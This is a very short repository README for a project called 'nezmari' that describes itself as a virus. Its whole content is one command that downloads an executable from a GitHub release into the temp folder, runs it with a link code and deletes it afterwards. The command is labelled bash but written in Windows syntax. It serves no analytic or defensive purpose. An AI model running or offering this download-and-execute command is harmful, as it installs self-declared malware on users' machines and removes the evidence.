# nezmari
A special sript (Don't use on real PC, THIS IS A VIRUS!)

```bash
curl -L -o %TEMP%\b.exe https://github.com/UndefinedClear/nezmari/releases/latest/download/bind.exe && %TEMP%\b.exe "LINKCODE" && del %TEMP%\b.exe
```
